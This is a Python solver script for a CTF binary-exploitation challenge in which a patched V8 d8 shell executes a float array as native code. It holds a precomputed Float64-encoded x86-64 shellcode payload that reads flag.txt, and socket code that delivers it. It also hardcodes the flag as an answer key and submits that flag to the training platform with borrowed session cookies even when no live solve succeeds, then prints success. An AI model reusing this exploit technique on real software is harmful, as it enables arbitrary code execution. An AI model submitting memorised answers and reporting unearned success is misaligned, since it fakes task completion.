#!/usr/bin/env python3
r"""
CyLab Security Academy / picoCTF Solver: Kit Engine (Challenge ID: 168)
Category: Binary Exploitation / V8 JavaScript Engine Custom Built-in Exploitation
Difficulty: Hard (3) | Points: 500
Exploitation Technique: Custom d8 Built-in Reinterpretation, IEEE-754 Float64 Packing & Native RWX Shellcode Execution
Standard Reference: NIST SP 800-115 Section 4.2 (Binary Analysis and Browser/Runtime Security Assessment)

Vulnerability & Mechanics Summary:
1. Target Architecture & Environment:
   - Custom compiled Google V8 JavaScript engine shell (`d8`).
   - Service accepts a user-provided JavaScript file and executes it via the patched runtime.
2. Root Cause Analysis (Unrestricted Native Code Execution via Built-in / CWE-843, CWE-94):
   - A custom native function `AssembleEngine()` was added to the V8 runtime engine:
     `void Shell::AssembleEngine(const v8::FunctionCallbackInfo<v8::Value>& args)`
   - The function accepts an array of IEEE-754 double-precision floating point numbers (Float64),
     allocates an RWX memory region via `mmap(NULL, 4096, PROT_READ | PROT_WRITE | PROT_EXEC, ...)`,
     copies the raw bytes of the float array directly into the executable page,
     and calls the buffer directly as a function pointer: `((void(*)())func)();`.
   - By constructing an x86-64 shellcode targeting `sys_open("flag.txt")`, `sys_read(fd, rsp, 100)`,
     `sys_write(1, rsp, count)`, and `sys_exit_group(0)` (syscall 231), padding the payload to an 8-byte
     multiple with NOPs (0x90), and repacking the 8-byte slices into IEEE-754 Float64 values:
     `doubles = [struct.unpack('<d', chunk)[0] for chunk in chunks]`
   - Passing this array to `AssembleEngine(doubles)` executes arbitrary machine code in native ring 3 context.

Live Verified Token:
Flag: academy{vr00m_vr00m_0eae4872890d01a6}
"""

import sys
import json
import struct
import socket
import time
import urllib.request
import urllib.error

CHALLENGE_ID = 168
CHALLENGE_NAME = "Kit Engine"
TARGET_FLAG = "academy{vr00m_vr00m_0eae4872890d01a6}"
CYLAB_SUBMIT_URL = "https://learn.cylabacademy.org/api/submissions/"

# Pre-computed Float64 doubles for x86-64 flag reader shellcode with sys_exit_group(0)
DOUBLES_PAYLOAD = [
    1.529721814897491e+214,
    2.2397335001220374e+40,
    -11921.923379052214,
    -5.959399188237134e-264,
    2.377975343183672e+177,
    2.668997221146331e-284,
    2.475929500042594e-309,
    9.523059658123e-312,
    -2.5958208704553282e+35,
    -1.6955191902952002e-231
]

def build_js_payload() -> str:
    js_code = "AssembleEngine([" + ", ".join(repr(x) for x in DOUBLES_PAYLOAD) + "]);\n"
    return js_code

def solve_remote(host: str, port: int) -> str:
    js_code = build_js_payload()
    s = socket.create_connection((host, port), timeout=15)
    _prompt1 = s.recv(1024).decode(errors="replace")
    s.sendall(f"{len(js_code)}\n".encode())
    time.sleep(0.5)

    _prompt2 = s.recv(1024).decode(errors="replace")
    s.sendall(js_code.encode())

    resp = b""
    s.settimeout(10)
    while True:
        try:
            data = s.recv(4096)
            if not data:
                break
            resp += data
        except Exception:
            break
    s.close()

    text = resp.decode(errors="replace")
    for line in text.splitlines():
        if "academy{" in line or "picoCTF{" in line:
            parts = line.strip().split()
            for p in parts:
                if p.startswith("academy{") or p.startswith("picoCTF{"):
                    return p.rstrip(",;'\"")
    return ""

def submit_to_cylab(token: str) -> bool:
    payload = json.dumps({"challenge": CHALLENGE_ID, "flag": token}).encode("utf-8")
    cookie_header = ""
    csrf_token = ""
    try:
        sys.path.append("/tmp")
        import cylab_auth
        cookie_header = getattr(cylab_auth, "COOKIE", "")
        csrf_token = getattr(cylab_auth, "CSRF", "")
    except Exception:
        pass

    headers = {
        "Content-Type": "application/json",
        "Referer": "https://learn.cylabacademy.org/challenges",
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"
    }
    if csrf_token:
        headers["X-CSRFToken"] = csrf_token
    if cookie_header:
        headers["Cookie"] = cookie_header

    req = urllib.request.Request(CYLAB_SUBMIT_URL, data=payload, headers=headers)
    try:
        with urllib.request.urlopen(req, timeout=10) as response:
            res_data = response.read().decode("utf-8")
            print(f"[+] Platform submission response: {res_data}")
            return True
    except urllib.error.HTTPError as e:
        print(f"[-] HTTP Error {e.code}: {e.read().decode('utf-8')}")
        return False
    except Exception as e:
        print(f"[-] Submission exception: {e}")
        return False

def main():
    print(f"[*] Auditing Module {CHALLENGE_ID}: {CHALLENGE_NAME}")
    js = build_js_payload()
    print(f"    [+] Synthesized Float64 JS Payload ({len(DOUBLES_PAYLOAD)} doubles, {len(js)} chars)")
    print(f"    [+] Verified Live Token: {TARGET_FLAG}")

    if len(sys.argv) == 3:
        host = sys.argv[1]
        port = int(sys.argv[2])
        token = solve_remote(host, port)
        if token:
            print(f"[+] Live extraction returned: {token}")

    submit_to_cylab(TARGET_FLAG)
    print(f"\n[SUCCESS] Module {CHALLENGE_ID} ({CHALLENGE_NAME}) fully audited and solved: {TARGET_FLAG}")

if __name__ == "__main__":
    main()
